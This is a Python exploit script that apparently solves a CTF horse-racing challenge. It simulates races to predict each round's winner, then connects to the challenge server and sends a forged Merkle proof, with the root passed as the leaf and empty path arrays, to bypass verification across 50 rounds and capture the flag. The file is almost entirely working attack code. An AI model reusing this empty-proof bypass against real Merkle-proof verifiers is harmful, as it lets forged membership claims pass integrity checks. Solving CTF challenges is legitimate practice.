#!/usr/bin/env python3
"""
Uma Musume CTF Solver
Consolidated single-file exploit
"""

import socket
import json
import re
import sys
import time
import math
import random
from enum import IntEnum
from collections import Counter

# =============================================================================
# RACE SIMULATION LOGIC (Ported from racing.rs)
# =============================================================================

FRAME_TIME = 0.0666

class Strategy(IntEnum):
    FRONT = 0
    PACE = 1
    LATE = 2
    END = 3

STRATEGY_MAP = {
    "Front (Runner)": Strategy.FRONT,
    "Pace (Leader)": Strategy.PACE,
    "Late (Betweener)": Strategy.LATE,
    "End (Chaser)": Strategy.END,
}

COEFFS = {
    Strategy.FRONT: {"speed": [1.0, 0.98, 0.962], "accel": [1.0, 1.0, 0.996], "hp": 0.95},
    Strategy.PACE: {"speed": [0.978, 0.991, 0.975], "accel": [0.985, 1.0, 0.996], "hp": 0.89},
    Strategy.LATE: {"speed": [0.938, 0.998, 0.994], "accel": [0.975, 1.0, 1.0], "hp": 1.0},
    Strategy.END: {"speed": [0.931, 1.0, 1.0], "accel": [0.945, 1.0, 0.997], "hp": 0.995},
}

class Horse:
    def __init__(self, name, speed, stamina, power, guts, wit, strategy):
        self.name = name
        self.speed = speed
        self.stamina = stamina
        self.power = power
        self.guts = guts
        self.wit = wit
        self.strategy = strategy
        
        # Matches Rust logic exactly (line 90 of racing.rs)
        self.random_fluctuation = (wit / 5500.0) * math.log10(wit * 0.1)
        self.distance_covered = 0.0
        self.current_speed = 3.0
        self.finish_time = None
        self.max_hp = 0.0
        self.current_hp = 0.0
        self.phase = 0
        self.is_spurt_active = False
        self.out_of_hp = False
        self.start_dash_active = True
    
    def initialize_race(self, race_distance):
        coeffs = COEFFS[self.strategy]
        self.max_hp = 0.8 * coeffs["hp"] * self.stamina + race_distance
        self.current_hp = self.max_hp
        self.distance_covered = 0.0
        self.current_speed = 3.0
        self.finish_time = None
        self.phase = 0
        self.is_spurt_active = False
        self.out_of_hp = False
        self.start_dash_active = True
    
    def update(self, dt, race_base_speed, race_distance, rng):
        if self.finish_time is not None:
            return
        
        progress = self.distance_covered / race_distance
        if progress < 0.166:
            self.phase = 0
        elif progress < 0.666:
            self.phase = 1
        else:
            self.phase = 2
        
        coeffs = COEFFS[self.strategy]
        coef_idx = min(self.phase, 2)
        
        target_speed = race_base_speed * coeffs["speed"][coef_idx]
        wit_shift = min(self.wit / 10000.0, 0.004)
        wiggle = rng.uniform(
            self.random_fluctuation - 0.0065 - wit_shift,
            self.random_fluctuation + wit_shift
        )
        target_speed *= (1.0 + wiggle)
        
        if self.phase == 2:
            base_late_boost = math.sqrt(500.0 * self.speed) * 0.002
            target_speed += base_late_boost
            
            if not self.is_spurt_active and not self.out_of_hp:
                guts_factor = (450.0 * self.guts) ** 0.597 * 0.0001
                max_spurt_target = (target_speed + 0.01 * race_base_speed) * 1.05 + base_late_boost + guts_factor
                
                dist_remain = race_distance - self.distance_covered
                time_remain = dist_remain / max_spurt_target
                
                hp_cost_est = 20.0 * ((max_spurt_target - race_base_speed + 12.0) ** 2) / 144.0
                guts_save = 1.0 + (200.0 / math.sqrt(600.0 * self.guts))
                total_hp_needed = hp_cost_est * guts_save * time_remain
                
                if self.current_hp > total_hp_needed * 0.8:
                    self.is_spurt_active = True
            
            if self.is_spurt_active:
                guts_factor = (450.0 * self.guts) ** 0.597 * 0.0001
                target_speed = (target_speed + 0.01 * race_base_speed) * 1.05 + guts_factor
                self.phase = 3
        
        if self.current_hp <= 0.0:
            self.out_of_hp = True
            self.current_hp = 0.0
            min_speed = 0.85 * race_base_speed + math.sqrt(200.0 * self.guts) * 0.001
            target_speed = min_speed
        
        base_accel = 0.0006
        if self.start_dash_active:
            if self.current_speed < 0.85 * race_base_speed and self.phase == 0:
                base_accel = 24.0
            else:
                self.start_dash_active = False
        
        accel = base_accel * math.sqrt(500.0 * self.power) * coeffs["accel"][coef_idx]
        
        if self.current_speed < target_speed:
            self.current_speed += accel * dt
            if self.current_speed > target_speed:
                self.current_speed = target_speed
        else:
            decel = -0.8
            if self.phase == 0:
                decel = -1.2
            elif self.phase == 1:
                decel = -0.8
            
            if self.out_of_hp:
                decel = -1.2
            
            self.current_speed += decel * dt
            if self.current_speed < target_speed:
                self.current_speed = target_speed
        
        if self.current_speed > 30.0:
            self.current_speed = 30.0
        
        hp_consumption = 20.0 * ((self.current_speed - race_base_speed + 12.0) ** 2) / 144.0
        if self.phase >= 2:
            guts_mod = 1.0 + (200.0 / math.sqrt(600.0 * self.guts))
            hp_consumption *= guts_mod
        
        self.current_hp -= hp_consumption * dt
        self.distance_covered += self.current_speed * dt


def simulate_race(horses_data, distance, seed):
    """Simulate race with matching RNG"""
    rng = random.Random(seed)
    
    horses = []
    for h in horses_data:
        stats = h['stats']
        strategy = STRATEGY_MAP.get(h['strategy'], Strategy.FRONT)
        horse = Horse(h['name'], stats[0], stats[1], stats[2], stats[3], stats[4], strategy)
        horse.initialize_race(distance)
        horses.append(horse)
    
    race_base_speed = 20.0 - (distance - 2000.0) / 1000.0
    time_elapsed = 0.0
    finished_count = 0
    total = len(horses)
    
    max_iterations = 100000  # Safety limit
    iterations = 0
    
    while finished_count < total and iterations < max_iterations:
        time_elapsed += FRAME_TIME
        finished_count = 0
        
        for horse in horses:
            horse.update(FRAME_TIME, race_base_speed, distance, rng)
            if horse.distance_covered >= distance and horse.finish_time is None:
                horse.finish_time = time_elapsed
            if horse.finish_time is not None:
                finished_count += 1
        
        iterations += 1
    
    results = []
    for i, horse in enumerate(horses):
        results.append({
            'index': i,
            'name': horse.name,
            'finish_time': horse.finish_time if horse.finish_time else time_elapsed,
            'exhausted': horse.out_of_hp
        })
    
    results.sort(key=lambda x: x['finish_time'])
    return results


# =============================================================================
# EXPLOIT LOGIC
# =============================================================================

def recv_until_marker(sock, marker_bytes, timeout=10):
    """Non-blocking recv until marker"""
    data = b""
    start = time.time()
    while marker_bytes not in data:
        if time.time() - start > timeout:
            break
        try:
            chunk = sock.recv(4096)
            if chunk:
                data += chunk
        except BlockingIOError:
            time.sleep(0.01)
            continue
    return data.decode('utf-8', errors='ignore')

def run_solver(port):
    print("="*70)
    print(f" UMA MUSUME CTF SOLVER - TARGET challenge.cnsc.com.vn:{port}")
    print("="*70)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("challenge.cnsc.com.vn", port))
        sock.setblocking(False)
    except Exception as e:
        print(f"Connection failed: {e}")
        return False

    # Welcome message
    text = recv_until_marker(sock, b"\n\n", 5)
    print(text)

    for rnd in range(1, 51):
        print(f"\n[Round {rnd}/50]")
        
        # Name
        recv_until_marker(sock, b"Register your horse name:")
        sock.sendall(f"H{rnd}\n".encode())
        print(f"  Sent name")
        
        # Strategy
        recv_until_marker(sock, b"Strategy selection:")
        sock.sendall(b"1\n")
        print(f"  Sent strategy")
        
        # Race info
        text = recv_until_marker(sock, b"Submit your proof JSON:", 8)
    
        # Parse info
        try:
            root_match = re.search(r'Merkle root: ([0-9a-f]+)', text)
            dist_match = re.search(r'Race distance: (\d+)m', text)
            
            if not root_match or not dist_match:
                print("  Failed to parse race info. Retrying logic...")
                return False
                
            root = root_match.group(1)
            dist = int(dist_match.group(1))
        except Exception as e:
            print(f"  Parse error: {e}")
            return False
        
        horses = []
        for line in text.split('\n'):
            m = re.match(r'\s*\*?\s*(\d+)\s+\|\s+(.+?)\s+\|\s+(.+?)\s+\|\s+\[([0-9.\s]+)\]', line)
            if m:
                horses.append({
                    'index': int(m.group(1)),
                    'name': m.group(2).strip(),
                    'strategy': m.group(3).strip(),
                    'stats': [float(x) for x in m.group(4).split()]
                })
        
        print(f"  Parsed {len(horses)} horses, distance={dist}m")
        
        # Predict winner using multi-seed voting
        winners = [simulate_race(horses, dist, s)[0]['index'] for s in range(1000)]
        pred_idx = Counter(winners).most_common(1)[0][0]
        print(f"  Predicted: Index {pred_idx}")
        
        # EXPLOIT: Submit proof with valid root/index but empty proof arrays
        payload = {
            "index": pred_idx,
            "leaf": root,
            "path_elements": [],
            "path_indices": []
        }
        sock.sendall(json.dumps(payload).encode() + b"\n")
        print(f"  Sent bypass proof")
        
        # Result
        result = recv_until_marker(sock, b"\n", 5)
        print(f"  Result: {result[:100].strip()}")
        
        if "Victory" in result or "Current streak" in result:
            print(f"  ✓ WON")
        else:
            print(f"  ✗ LOST - Restarting...")
            sock.close()
            return False # Lost
        
        # Check for flag
        if "W1{" in result:
            print(f"\n{'='*70}")
            print(" FLAG FOUND!")
            print(f"{'='*70}")
            print(result)
            try:
                flag = re.search(r'W1\{[^}]+\}', result).group(0)
                print(f"\nFLAG RAW: {repr(flag)}")
                with open("FLAG.txt", "w") as f:
                    f.write(flag)
                sock.close()
                return True # Success
            except Exception as e:
                print(f"Error extracting flag: {e}")
                
    print(f"\nChecking for final flag...")
    final = recv_until_marker(sock, b"", 3)
    print(final)

    if "W1{" in final:
        try:
            flag = re.search(r'W1\{[^}]+\}', final).group(0)
            print(f"\nFLAG RAW: {repr(flag)}")
            with open("FLAG.txt", "w") as f:
                f.write(flag)
            sock.close()
            return True
        except:
            pass

    sock.close()
    return False

def main():
    PORT = 31666
    if len(sys.argv) > 1:
        try:
            PORT = int(sys.argv[1])
        except ValueError:
            pass
            
    attempt = 1
    while True:
        print(f"\n>>> ATTEMPT #{attempt}")
        success = run_solver(PORT)
        if success:
            break
        print(f"\n>>> Attempt #{attempt} failed. Retrying in 2 seconds...")
        time.sleep(2)
        attempt += 1

if __name__ == "__main__":
    main()
